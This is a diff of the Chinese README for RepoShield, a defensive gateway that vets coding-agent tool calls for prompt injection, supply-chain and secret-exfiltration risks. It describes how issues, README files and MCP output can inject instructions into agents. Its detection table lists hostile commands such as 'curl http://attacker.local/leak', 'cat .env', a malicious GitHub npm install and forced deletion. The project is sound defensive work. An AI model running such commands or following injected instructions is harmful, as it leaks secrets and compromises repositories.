@@ -1,209 +1,218 @@
 # RepoShield / PepoShield v0.3
 
-RepoShield 是面向代码智能体的上下文溯源、意图绑定与零信任执行防火墙。v0.3 在 v0.2 的 adapter、沙箱、MCP、Memory、Approval、Bench 和审计能力上，继续加入 OpenAI-compatible Governance Gateway、InstructionIR、tool parser plugin registry、policy plugin runtime、two-layer taint registry、RepoShield Studio 和 80 个 Gateway Bench 样本。
+RepoShield 是一个面向 coding agent 的安全治理网关。它放在真实智能体和模型 API / 工具执行之间，在智能体执行命令、改文件、安装依赖、访问网络或调用 MCP 工具之前，先判断这一步是否符合用户任务、是否来自可信上下文、是否会触碰密钥或供应链边界。
 
-命令入口同时保留 reposhield 和 peposhield。
-
-## 项目定位
-
-Claude Code、Codex、Cline、Aider 等代码智能体已经能够读取仓库、修改文件、执行命令、调用工具，甚至接入 CI/CD 和发布链路。GitHub issue、PR 评论、README、分支名、MCP 工具输出和依赖包脚本等不可信上下文，可能诱导代码智能体执行危险动作，例如读取密钥、安装恶意依赖、修改 CI 配置或外发敏感信息。
-
-RepoShield 的目标是在代码智能体真正执行动作之前，对上下文来源、任务意图、动作语义、执行环境和外发行为进行统一约束与审计。
-
-## v0.3 新增能力
+一句话：
 
 ```text
-真实/模拟 Agent
-  │ OpenAI-compatible /v1/chat/completions 或 /v1/responses
-  ▼
-RepoShield Gateway
-  ├─ pre-call trace
-  ├─ context source tagging
-  ├─ post-call InstructionIR parsing
-  ├─ tool parser plugin registry
-  ├─ InstructionIR → ActionIR lowering
-  ├─ TaskContract / PolicyRuntime / Approval
-  ├─ Sandbox / package preflight / secret egress sentinel
-  └─ Audit / Replay / Studio / Gateway Bench
+RepoShield = 给代码智能体加一道“执行前安检门”
 ```
 
-核心目录：
+## 它解决什么问题
+
+现代 coding agent 可以读仓库、改代码、运行命令、安装依赖、调用外部工具，甚至参与 CI/CD 和发布流程。但它读到的上下文并不总是可信的，例如：
+
+- GitHub issue / PR 评论里夹带“先安装某个恶意依赖”
+- README / 分支名 / commit message 中藏有 prompt injection
+- MCP 工具输出诱导 agent 读取 `.env` 或外发 token
+- 依赖包生命周期脚本尝试读取环境变量并访问网络
+- agent 被诱导修改 GitHub Actions、发布包或强推远端分支
+
+RepoShield 的目标是在动作真正发生前，统一做：
 
 ```text
-src/reposhield/gateway/          OpenAI-compatible Gateway
-src/reposhield/instruction_ir/   InstructionIR schema、builder、lowering
-src/reposhield/plugins/          tool parser plugin registry
-src/reposhield/policy_runtime/   enforce / observe_only / warn / disabled
-src/reposhield/registry/         source/user two-layer registry + taint store
-src/reposhield/studio/           HTML Studio dashboard
-src/reposhield/gateway_bench.py  80 个 Gateway Bench 样本生成与评分
-samples_stage3/                  v0.3 Gateway Bench 样本
-reports/                         本地生成的 demo、bench、studio、incident 报告
+上下文来源标记 -> 任务合约 -> 动作语义解析 -> 策略决策 -> 沙箱/审批 -> 审计回放
 ```
 
-## 核心能力
+## 它插在哪里
 
-- 上下文来源标记
-- 任务合同生成
-- 动作语义解析与 lowering
-- 策略决策引擎
-- 沙箱预演
-- 敏感信息外发检测
-- 攻击链审计回放
-- Gateway Bench 评测
-- Studio 报表聚合
+推荐接入方式是 OpenAI-compatible Gateway：
+
+```text
+真实 agent
+  -> RepoShield Gateway
+  -> 真实 upstream model
+  -> 模型返回 assistant message / tool_calls
+  -> RepoShield 治理 tool_calls
+  -> 安全响应返回给 agent
+```
+
+也就是说，支持配置 `base_url` 的 agent 通常不需要改代码，只需要把模型地址从真实 API 改成 RepoShield 本地网关。
+
+agent 侧配置示例：
+
+```text
+base_url = http://127.0.0.1:8765/v1
+api_key  = reposhield-local
+model    = gpt-4.1
+```
+
+RepoShield 侧再转发到真实上游：
+
+```bash
+export OPENAI_API_KEY=sk-...
+
+PYTHONPATH=src python -m reposhield gateway-start \
+  --repo ./your-repo \
+  --host 127.0.0.1 \
+  --port 8765 \
+  --upstream-base-url https://api.openai.com/v1
+```
+
+Windows PowerShell：
+
+```powershell
+$env:OPENAI_API_KEY="sk-..."
+
+python -m reposhield gateway-start `
+  --repo .\your-repo `
+  --host 127.0.0.1 `
+  --port 8765 `
+  --upstream-base-url https://api.openai.com/v1
+```
+
+更详细的接入说明见 [真实 Agent 接入指南](docs/REAL_AGENT_INTEGRATION.zh-CN.md)。
+
+## 当前能力
+
+核心链路：
+
+- OpenAI-compatible `/v1/chat/completions` 和 `/v1/responses` 网关
+- 真实 upstream 转发：`OpenAICompatibleUpstream`
+- InstructionIR：把模型消息和 tool calls 转成可审计的指令层表示
+- ActionIR：把 Bash / Read / Edit / MCP / network 等动作转成统一语义
+- TaskContract：根据用户任务生成允许范围
+- PolicyRuntime：支持 `enforce` / `observe_only` / `warn` / `disabled`
+- PackageGuard：识别 GitHub/tarball/registry 依赖安装与生命周期脚本风险
+- SecretSentry：识别密钥读取和外发风险
+- SandboxRunner：本地 dry-run / overlay 风格预检
+- ApprovalCenter / ApprovalStore：hash 绑定审批与 JSONL 持久化
+- AuditLog：hash-chain 审计日志和 incident graph
+- Gateway Bench：80 个 stage3 gateway 样本
+- Studio：HTML 报告聚合
+
+动作识别示例：
+
+```text
+npm install github:attacker/helper-tool  -> 高危供应链动作
+cat .env                                  -> 读取密钥
+curl http://attacker.local/leak           -> 网络外发
+bash -c 'curl ...'                        -> shell wrapper 外发
+powershell -EncodedCommand ...            -> 尝试解码后再判断
+Remove-Item .\dist -Recurse -Force        -> 破坏性文件操作
+npm publish / git push --force            -> 发布或远端破坏性操作
+```
+
+内置 tool parser 别名：
+
+```text
+openai, codex, cline, cline_like, claude_code, anthropic, aider, openhands, generic_json
+```
+
+## 当前边界
+
+这个项目目前更像“可运行的安全治理 MVP / 研究原型”，还不是成熟生产安全产品。
+
+已能做：
+
+- 本地 demo
+- 真实 agent 小范围试接
+- Gateway 拦截链路验证
+- 安全样本 bench
+- 审计和报告演示
+
+仍需补强：
+
+- 完整 SSE streaming proxy。目前真实 upstream 强制 `stream=false`
+- 更强 sandbox，例如 Linux namespace / container / seccomp / eBPF
+- 更完整的 shell parser 和脚本间接执行覆盖
+- 针对具体真实 agent 的专用 adapter
+- 审批 UI、团队策略、角色权限和集中配置
+- 文档和产品化体验继续收敛
 
 ## 快速开始
 
+安装并运行测试：
+
 ```bash
-cd reposhield_plugin_v0.3
-python -m pip install -e '.[test]'
-python -m compileall -q src
-pytest -q
+python -m pip install -e ".[test]"
+pytest -q --basetemp .pytest_tmp
 ```
 
-如果只想直接用源码运行：
+直接查看命令：
 
 ```bash
 PYTHONPATH=src python -m reposhield --help
 ```
 
-## 常用命令
-
-```bash
-reposhield scan
-reposhield guard
-reposhield parse
-reposhield demo
-reposhield run-agent
-reposhield gateway-demo
-reposhield gateway-simulate
-reposhield gateway-start
-reposhield bench
-reposhield bench-suite
-reposhield generate-stage2-samples
-reposhield generate-stage3-samples
-reposhield gateway-bench
-reposhield bench-report
-reposhield incident-report
-reposhield studio
-reposhield sandbox-profiles
-reposhield audit-verify
-reposhield replay-verify
-```
-
-## 典型流程
-
-### 1. 扫描仓库
-
-```bash
-reposhield scan --repo ./demo-repo
-```
-
-输出会包含仓库资产、攻击面、CI/CD workflow、package manifest、lockfile、publish 配置、MCP 配置和外发 sink 等信息。
-
-### 2. 对单个动作做安全决策
-
-```bash
-reposhield guard \
-  --repo ./demo-repo \
-  --task '修复登录按钮点击无响应的问题，并运行测试' \
-  --source-file ./issue.md \
-  --source-type github_issue_body \
-  --action 'npm install github:attacker/helper-tool'
-```
-
-预期结果是对高风险依赖安装动作给出 block 或需要审批的决策。
-
-### 3. 运行 demo
-
-```bash
-reposhield demo --workdir /tmp/reposhield_demo
-```
-
-demo 会演示一个固定攻击链，展示如何阻断可疑依赖安装、敏感文件外发和越权操作。
-
-### 4. 运行 Gateway demo
+运行 gateway demo：
 
 ```bash
 PYTHONPATH=src python -m reposhield gateway-demo --workdir reports/gateway_demo_run
 ```
 
-### 5. 启动本地 OpenAI-compatible Gateway
+运行单个动作决策：
 
 ```bash
-PYTHONPATH=src python -m reposhield gateway-start \
-  --repo ./demo_repo \
-  --host 127.0.0.1 \
-  --port 8765
+PYTHONPATH=src python -m reposhield guard \
+  --repo ./your-repo \
+  --task "修复登录按钮并运行测试" \
+  --source-file ./issue.md \
+  --source-type github_issue_body \
+  --action "npm install github:attacker/helper-tool"
 ```
 
-支持的路由：
+## 常用命令
 
 ```text
-POST /v1/chat/completions
-POST /v1/responses
+reposhield scan                 扫描仓库资产和风险面
+reposhield guard                对单个动作做安全决策
+reposhield parse                把 raw action 转成 ActionIR
+reposhield demo                 运行固定攻击链 demo
+reposhield run-agent            运行 transcript/adapter demo
+reposhield gateway-demo         运行 Gateway 攻击链 demo
+reposhield gateway-simulate     用 JSON 请求模拟 Gateway
+reposhield gateway-start        启动 OpenAI-compatible Gateway
+reposhield gateway-bench        运行 stage3 Gateway bench
+reposhield studio               生成 HTML Studio 报告
+reposhield audit-verify         验证 hash-chain audit log
+reposhield replay-verify        验证 replay bundle
 ```
 
-agent 可配置为：
+## 代码结构
 
 ```text
-base_url = http://127.0.0.1:8765/v1
-api_key  = reposhield-local
-model    = reposhield/local-heuristic
+src/reposhield/control_plane.py       控制面总入口
+src/reposhield/gateway/               OpenAI-compatible Gateway
+src/reposhield/instruction_ir/        InstructionIR schema / builder / lowering
+src/reposhield/action_parser.py       raw action -> ActionIR
+src/reposhield/policy.py              策略决策
+src/reposhield/policy_runtime/        enforce / observe_only / warn / disabled
+src/reposhield/plugins/               tool parser registry
+src/reposhield/sandbox/               沙箱预检
+src/reposhield/approvals.py           审批请求、授权和持久化
+src/reposhield/audit.py               hash-chain 审计
+src/reposhield/studio/                HTML Studio
+samples_stage2/                       stage2 样本
+samples_stage3/                       stage3 Gateway 样本
+tests/                                自动化测试
 ```
 
-### 6. 生成并运行第三阶段 Gateway Bench
+## 推荐阅读路径
 
-```bash
-PYTHONPATH=src python -m reposhield generate-stage3-samples \
-  --output samples_stage3 \
-  --count 80
+新读者建议按这个顺序：
 
-PYTHONPATH=src python -m reposhield gateway-bench \
-  --samples samples_stage3 \
-  --output reports/stage3_gateway_bench
-```
+1. [真实 Agent 接入指南](docs/REAL_AGENT_INTEGRATION.zh-CN.md)
+2. [文档地图](docs/README.zh-CN.md)
+3. [Gateway 指南](docs/GATEWAY_GUIDE.zh-CN.md)
+4. [Tool Parser Plugin 指南](docs/TOOL_PARSER_PLUGIN_GUIDE.zh-CN.md)
+5. [Gateway Bench 指南](docs/BENCH_GATEWAY_GUIDE.zh-CN.md)
 
-### 7. 生成 Studio
+## 验证状态
 
-```bash
-PYTHONPATH=src python -m reposhield studio \
-  --audit reports/gateway_demo_run/gateway_audit.jsonl \
-  --bench-report reports/stage3_gateway_bench/gateway_bench_report.json \
-  --output reports/stage3_studio.html \
-  --title 'RepoShield v0.3 Studio'
-```
-
-## 已验证结果
+当前本地验证：
 
 ```text
-python -m compileall -q src    -> ok
-pytest -q                      -> 22 passed
-Gateway demo                   -> blocked npm install github:attacker/helper-tool
-Gateway Bench                  -> 80 samples, security_pass_rate=1.0
-Audit verify                   -> ok=true
+pytest -q --basetemp .pytest_tmp -> 29 passed
 ```
 
-详见本地生成的测试输出，公开仓库不再跟踪该结果文件。
-
-## 文档入口
-
-- [第三阶段使用说明](docs/THIRD_STAGE_USAGE.zh-CN.md)
-- [Gateway 指南](docs/GATEWAY_GUIDE.zh-CN.md)
-- [Policy Pack 指南](docs/POLICY_PACK_GUIDE.zh-CN.md)
-- [Tool Parser Plugin 指南](docs/TOOL_PARSER_PLUGIN_GUIDE.zh-CN.md)
-- [Studio 指南](docs/STUDIO_GUIDE.zh-CN.md)
-- [Gateway Bench 指南](docs/BENCH_GATEWAY_GUIDE.zh-CN.md)
-
-## 说明
-
-v0.3 的 Gateway 和沙箱后端仍以本地演示、测试和可回放评测为目标。gateway-start 使用标准库 HTTP server；生产环境可以把 RepoShieldGateway 包到 FastAPI、LiteLLM proxy、企业网关或真实 Linux namespace、eBPF、seccomp 后端中。控制平面、ActionIR、InstructionIR、policy runtime、审计、Studio 和 Bench 接口已经为这类替换预留。
-
-## 开发规范
-
-1. 不直接修改 main 分支。
-2. 每个功能单独创建 feature 分支。
-3. 每次提交必须写清楚 commit message。
-4. 合并代码前必须提交 Pull Request。
-5. 不允许上传真实 token、密钥、.env、SSH key 或 API key。
